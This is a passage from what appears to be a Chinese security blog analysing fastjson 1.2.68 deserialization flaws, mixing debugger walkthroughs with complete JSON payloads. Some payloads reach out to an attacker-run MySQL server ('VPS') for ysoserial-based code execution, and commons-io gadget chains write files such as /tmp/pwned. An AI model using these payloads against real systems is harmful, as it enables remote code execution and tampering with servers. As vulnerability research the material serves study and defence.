class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">   <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection&quot;</span>,</span><br><span class="line">   <span class="attr">&quot;proxy&quot;</span>: &#123;</span><br><span class="line">          <span class="attr">&quot;connectionString&quot;</span>:&#123;</span><br><span class="line">                 <span class="attr">&quot;url&quot;</span>:<span class="string">&quot;jdbc:mysql://VPS:3306/name?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_CommonsBeanutils1_open /System/Applications/Calculator.app&quot;</span></span><br><span class="line">          &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div align=center><img src="/img/fastjson 1.2.68漏洞分析/21.png" alt="21" style="zoom:50%;" /></div><h4 id="2-3-3-Mysql-Connector-8-x"><a href="#2-3-3-Mysql-Connector-8-x" class="headerlink" title="2.3.3 Mysql Connector 8.x"></a>2.3.3 Mysql Connector 8.x</h4><p>关键类：com.mysql.cj.jdbc.ha.ReplicationMySQLConnection<br>按照blackhat上的介绍，适用版本：6.x or &lt; 8.0.20；但是根据目标这个利用链来说，只在8.0.19上触发了反序列化<br>因此适用版本：8.0.19反序列化，大于8.0.19 SSRF 来自：《 珂技知识分享》，时间原因，暂时没分析为什么其他版本利用链的构造</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ReplicationConnectionUrl</span><span class="params">(List&lt;HostInfo&gt; masters, List&lt;HostInfo&gt; slaves, Map&lt;String, String&gt; properties)</span> </span></span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.mysql.cj.jdbc.ha.ReplicationMySQLConnection&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;proxy&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;connectionUrl&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.mysql.cj.conf.url.ReplicationConnectionUrl&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;masters&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;host&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">&quot;slaves&quot;</span>: [],</span><br><span class="line">      <span class="attr">&quot;properties&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;host&quot;</span>: <span class="string">&quot;VPS&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;port&quot;</span>: <span class="number">3307</span>,</span><br><span class="line">        <span class="attr">&quot;user&quot;</span>: <span class="string">&quot;yso_CommonsBeanutils1_open /System/Applications/Calculator.app&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;dbname&quot;</span>: <span class="string">&quot;dbname&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;password&quot;</span>: <span class="string">&quot;pass&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;queryInterceptors&quot;</span>: <span class="string">&quot;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;autoDeserialize&quot;</span>: <span class="string">&quot;true&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-4-Commons-io利用链"><a href="#2-4-Commons-io利用链" class="headerlink" title="2.4 Commons-io利用链"></a>2.4 Commons-io利用链</h3><h4 id="2-4-1-ref"><a href="#2-4-1-ref" class="headerlink" title="2.4.1 $ref"></a>2.4.1 $ref</h4><p>不管在<code>DefaultJSONParser</code>还是<code>JavaBeanDeserializer</code>，在反序列化过程中，都会判断<code>key</code>是否是<code>$ref</code>，看之后的利用链，也都有<code>$ref</code>的身影<br>调试看到当遇到$ref时，会增加一个解析任务，</p><div align=center><img src="/img/fastjson 1.2.68漏洞分析/22.png" alt="22" style="zoom:50%;" /></div><p>之前的分析都是在<code>parse()</code>中，这里发现关于$ref的相关解析是在handleResovleTask中完成</p><div align=center><img src="/img/fastjson 1.2.68漏洞分析/23.png" alt="23" style="zoom:50%;" /></div><p><code>handleResovleTask</code></p><div align=center><img src="/img/fastjson 1.2.68漏洞分析/24.png" alt="24" style="zoom:50%;" /></div><p>调用栈</p><div align=center><img src="/img/fastjson 1.2.68漏洞分析/25.png" alt="25" style="zoom:50%;" /></div><blockquote><p>$ref是为了防止出现StackOverFlow异常，在一个对象被多次使用，第一次之后的使用就会变成这个对象第一次出现的位置。<br><a href="https://www.jianshu.com/p/50fe2b473cae">https://www.jianshu.com/p/50fe2b473cae</a></p></blockquote><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;$ref&quot;:&quot;$&quot;&#125;引用根对象</span><br><span class="line">&#123;&quot;$ref&quot;:&quot;@&quot;&#125;引用自己</span><br><span class="line">&#123;&quot;$ref&quot;:&quot;..&quot;&#125;引用父对象</span><br><span class="line">&#123;&quot;$ref&quot;:&quot;../..&quot;&#125;引用父对象的父对象</span><br><span class="line">&#123;&quot;$ref&quot;:&quot;$.members[0].reportTo&quot;&#125;基于路径的引用</span><br></pre></td></tr></table></figure><h4 id="2-4-2-写入文件"><a href="#2-4-2-写入文件" class="headerlink" title="2.4.2 写入文件"></a>2.4.2 写入文件</h4><p>版本限制：commons-io 2.0~2.6<br>由于2.2中，FileOutputStream利用链并不适用与所有的JDK/JRE版本，因此需要找到新的利用链，在voidfyoo的文章的思路，通过commons-io组件构造利用链</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;is&quot;</span>:&#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;input&quot;</span>:&#123;</span><br><span class="line">      <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;reader&quot;</span>:&#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.CharSequenceReader&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;charSequence&quot;</span>:&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.String&quot;</span><span class="string">&quot;aaaaaa&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">&quot;charsetName&quot;</span>:<span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;bufferSize&quot;</span>:<span class="number">1024</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;branch&quot;</span>:&#123;</span><br><span class="line">      <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;writer&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;file&quot;</span>: <span class="string">&quot;/tmp/pwned&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;encoding&quot;</span>: <span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;append&quot;</span>: <span class="literal">false</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">&quot;charset&quot;</span>: <span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;bufferSize&quot;</span>: <span class="number">1024</span>,</span><br><span class="line">      <span class="attr">&quot;writeImmediately&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;closeBranch&quot;</span>:<span class="literal">true</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;httpContentType&quot;</span>:<span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;lenient&quot;</span>:<span class="literal">false</span>,</span><br><span class="line">  <span class="attr">&quot;defaultEncoding&quot;</span>:<span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是使用上面的<code>poc</code>新建的文件没有写入内容</p><h5 id="2-4-2-1-XmlStreamReader"><a href="#2-4-2-1-XmlStreamReader" class="headerlink" title="2.4.2.1 XmlStreamReader"></a>2.4.2.1 XmlStreamReader</h5><p>入口点<code>XmlStreamReader</code>类，</p><div align=center><img src="/img/fastjson 1.2.68漏洞分析/26.png" alt="26" style="zoom:50%;" /></div><h5 id="2-4-2-1-TeeInputStream"><a href="#2-4-2-1-TeeInputStream" class="headerlink" title="2.4.2.1 TeeInputStream"></a>2.4.2.1 TeeInputStream</h5><p>对应poc和<code>XmlStreamReader</code>的构造参数，is构造为<code>TeeInputStream</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">TeeInputStream</span><span class="params">(InputStream input, OutputStream branch)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>(input, branch, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参数：input、branch</p><p><strong>a. input参数</strong><br>构造类：ReaderInputStream</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ReaderInputStream</span><span class="params">(Reader reader, CharsetEncoder encoder, <span class="keyword">int</span> bufferSize)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.reader = reader;</span><br><span class="line">    <span class="keyword">this</span>.encoder = encoder;</span><br><span class="line">    <span class="keyword">this</span>.encoderIn = CharBuffer.allocate(bufferSize);</span><br><span class="line">    <span class="keyword">this</span>.encoderIn.flip();</span><br><span class="line">    <span class="keyword">this</span>.encoderOut = ByteBuffer.allocate(<span class="number">128</span>);</span><br><span class="line">    <span class="keyword">this</span>.encoderOut.flip();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>reader使用了<code>CharSequenceReader</code>类<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">CharSequenceReader</span><span class="params">(CharSequence charSequence)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.charSequence = (CharSequence)(charSequence != <span class="keyword">null</span> ? charSequence : <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><code>CharSequenceReader</code>的构造方法中是<code>CharSequence</code> 类型作为参数，<code>CharSequence</code>是一个接口，像常用的<code>String</code>就实现了这个接口</li></ul><p><strong>branch参数</strong><br>构造类：WriterOutputStream</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">WriterOutputStream</span><span class="params">(Writer writer, Charset charset, <span class="keyword">int</span> bufferSize, <span class="keyword">boolean</span> writeImmediately)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>(writer, charset.newDecoder().onMalformedInput(CodingErrorAction.REPLACE).onUnmappableCharacter(CodingErrorAction.REPLACE).replaceWith(<span class="string">&quot;?&quot;</span>), bufferSize, writeImmediately);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>writer使用了<code>FileWriterWithEncoding</code>类<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">FileWriterWithEncoding</span><span class="params">(String filename, String encoding, <span class="keyword">boolean</span> append)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>(<span class="keyword">new</span> File(filename), encoding, append);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h5 id="2-4-2-3-触发流程"><a href="#2-4-2-3-触发流程" class="headerlink" title="2.4.2.3 触发流程"></a>2.4.2.3 触发流程</h5><p>如voidfyoo的文章中的分析，如图位置执行到<code>this.in.read()</code>，而这个in参数，在<code>BOMInputStream</code>实例化时，传入了<code>TeeInputStream</code></p><div align=center><img src="/img/fastjson 1.2.68漏洞分析/27.png" alt="27" style="zoom:50%;" /></div><p><code>TeeInputStream</code>的<code>read</code>方法如下，将<code>reader</code>中的内容写入到<code>branch</code>中</p><div align=center><img src="/img/fastjson 1.2.68漏洞分析/28.png" alt="28" style="zoom:50%;" /></div><p><code>ReaderInputStream#fillBufer</code></p><div align=center><img src="/img/fastjson 1.2.68漏洞分析/29.png" alt="29" style="zoom:50%;" /></div><p><code>CharSequenceReader#read</code></p><div align=center><img src="/img/fastjson 1.2.68漏洞分析/30.png" alt="30" style="zoom:50%;" /></div><p>Reader的流程结束，看一下<code>OutputStream</code>的<code>branch</code>的流程，这里没有记录，因为可以参考一下voidfyoo的文章</p><h5 id="2-4-2-4-无法写入文件内容"><a href="#2-4-2-4-无法写入文件内容" class="headerlink" title="2.4.2.4 无法写入文件内容"></a>2.4.2.4 无法写入文件内容</h5><p>这里在使用$ref循环对inputStream和outputStream进行读出写入后，创建的文件仍然没有被写入内容，<br>抛出如下异常，分析过后发现，fastjson反序列化过程中，实例化WriterOutputStream类的时候，没有使用payload中想要的构造方法，因此charset为空，在写入文件内容的时候抛出异常。。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">create instance error, <span class="keyword">null</span>, <span class="keyword">public</span> org.apache.commons.io.input.XmlStreamReader(java.io.InputStream,java.lang.String,<span class="keyword">boolean</span>,java.lang.String) <span class="keyword">throws</span> java.io.IOException</span><br><span class="line">...</span><br><span class="line">Caused by: java.lang.NullPointerException</span><br><span class="line">at org.apache.commons.io.output.WriterOutputStream.processInput(WriterOutputStream.java:<span class="number">280</span>)</span><br><span class="line">at org.apache.commons.io.output.WriterOutputStream.write(WriterOutputStream.java:<span class="number">213</span>)</span><br><span class="line">at org.apache.commons.io.input.TeeInputStream.read(TeeInputStream.java:<span class="number">129</span>)</span><br><span class="line">at java.io.BufferedInputStream.fill(BufferedInputStream.java:<span class="number">246</span>)</span><br><span class="line">at java.io.BufferedInputStream.read(BufferedInputStream.java:<span class="number">265</span>)</span><br><span class="line">at org.apache.commons.io.input.BOMInputStream.getBOM(BOMInputStream.java:<span class="number">175</span>)</span><br><span class="line">at org.apache.commons.io.input.BOMInputStream.getBOMCharsetName(BOMInputStream.java:<span class="number">201</span>)</span><br><span class="line">at org.apache.commons.io.input.XmlStreamReader.doHttpStream(XmlStreamReader.java:<span class="number">439</span>)</span><br><span class="line">at org.apache.commons.io.input.XmlStreamReader.&lt;init&gt;(XmlStreamReader.java:<span class="number">326</span>)</span><br></pre></td></tr></table></figure><p>如图，在deserialze中看到当前的构造方法是<code>org.apache.commons.io.output.WriterOutputStream(java.io.Writer,java.nio.charset.CharsetDecoder,int,boolean)</code>；</p><div align=center><img src="/img/fastjson 1.2.68漏洞分析/31.png" alt="31" style="zoom:50%;" /></div><p>则我们的poc中，是想要使用charsetName参数的构造方法，即</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">WriterOutputStream</span><span class="params">(Writer writer, String charsetName, <span class="keyword">int</span> bufferSize, <span class="keyword">boolean</span> writeImmediately)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>(writer, Charset.forName(charsetName), bufferSize, writeImmediately);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div align=center><img src="/img/fastjson 1.2.68漏洞分析/32.png" alt="32" style="zoom:50%;" /></div><p>这里再回头看一下beaninfo在实例化的时候，在循环构造方法的地方，第四个构造方法排在前面会优先遍历，导致后面同样参数数量的构造方法<code>public org.apache.commons.io.output.WriterOutputStream(java.io.Writer,java.lang.String,int,boolean)</code>不会被使用。</p><div align=center><img src="/img/fastjson 1.2.68漏洞分析/33.png" alt="33" style="zoom:50%;" /></div><p>最终导致在WriteOutputStream#processInput方法中，decoder为空，抛出空指针异常</p><div align=center><img src="/img/fastjson 1.2.68漏洞分析/34.png" alt="34" style="zoom:50%;" /></div>这里看一下获取类构造方法的数组是怎么生成的，跟踪到Class.privateGetDeclaredConstructors方法，而获取构造方法数组的功能是一个native方法，到这就看不到了。。。<div align=center><img src="/img/fastjson 1.2.68漏洞分析/35.png" alt="35" style="zoom:50%;" /></div><h5 id="2-4-2-5-修改利用链中WriteOutputStream的参数"><a href="#2-4-2-5-修改利用链中WriteOutputStream的参数" class="headerlink" title="2.4.2.5 修改利用链中WriteOutputStream的参数"></a>2.4.2.5 修改利用链中WriteOutputStream的参数</h5><p>根据前面的问题，将<code>WriterOutputStream</code>中的charsetName修改为，随便找一个继承CharsetDecoder类的方法，jdk内置的一些类都是私有方法，在fastjson中找到 <code>com.alibaba.fastjson.util.UTF8Decoder</code> 继承了这个抽象类；但是这个类并没有实现 <code>AutoCloseable</code> 接口，因此这里我手动开启了<code>autoTypeSupport</code>支持，显然这样做就不能达到通用了。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">&quot;x&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;input&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;reader&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.input.CharSequenceReader&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;charSequence&quot;</span>: &#123;</span><br><span class="line">                <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.String&quot;</span><span class="string">&quot;some thing &gt; 8192&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">&quot;charsetName&quot;</span>: <span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;bufferSize&quot;</span>: <span class="number">1024</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">&quot;branch&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;writer&quot;</span>: &#123;</span><br><span class="line">                <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;file&quot;</span>: <span class="string">&quot;/tmp/common-write&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;encoding&quot;</span>: <span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;append&quot;</span>: <span class="literal">false</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">&quot;decoder&quot;</span>: &#123;</span><br><span class="line">                <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.alibaba.fastjson.util.UTF8Decoder&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">&quot;bufferSize&quot;</span>: <span class="number">1024</span>,</span><br><span class="line">            <span class="attr">&quot;writeImmediately&quot;</span>: <span class="literal">true</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">&quot;trigger&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;is&quot;</span>: &#123;</span><br><span class="line">                <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;input&quot;</span>: &#123;</span><br><span class="line">                    <span class="attr">&quot;$ref&quot;</span>: <span class="string">&quot;$.input&quot;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">&quot;branch&quot;</span>: &#123;</span><br><span class="line">                    <span class="attr">&quot;$ref&quot;</span>: <span class="string">&quot;$.branch&quot;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">&quot;closeBranch&quot;</span>: <span class="literal">true</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">&quot;httpContentType&quot;</span>: <span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;lenient&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">&quot;defaultEncoding&quot;</span>: <span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">&quot;trigger2&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;is&quot;</span>: &#123;</span><br><span class="line">                <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;input&quot;</span>: &#123;</span><br><span class="line">                    <span class="attr">&quot;$ref&quot;</span>: <span class="string">&quot;$.input&quot;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">&quot;branch&quot;</span>: &#123;</span><br><span class="line">                    <span class="attr">&quot;$ref&quot;</span>: <span class="string">&quot;$.branch&quot;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">&quot;closeBranch&quot;</span>: <span class="literal">true</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">&quot;httpContentType&quot;</span>: <span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;lenient&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">&quot;defaultEncoding&quot;</span>: <span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">&quot;trigger3&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;is&quot;</span>: &#123;</span><br><span class="line">                <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;input&quot;</span>: &#123;</span><br><span class="line">                    <span class="attr">&quot;$ref&quot;</span>: <span class="string">&quot;$.input&quot;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">&quot;branch&quot;</span>: &#123;</span><br><span class="line">                    <span class="attr">&quot;$ref&quot;</span>: <span class="string">&quot;$.branch&quot;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">&quot;closeBranch&quot;</span>: <span class="literal">true</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">&quot;httpContentType&quot;</span>: <span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;lenient&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">&quot;defaultEncoding&quot;</span>: <span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-4-3-读文件"><a href="#2-4-3-读文件" class="headerlink" title="2.4.3 读文件"></a>2.4.3 读文件</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 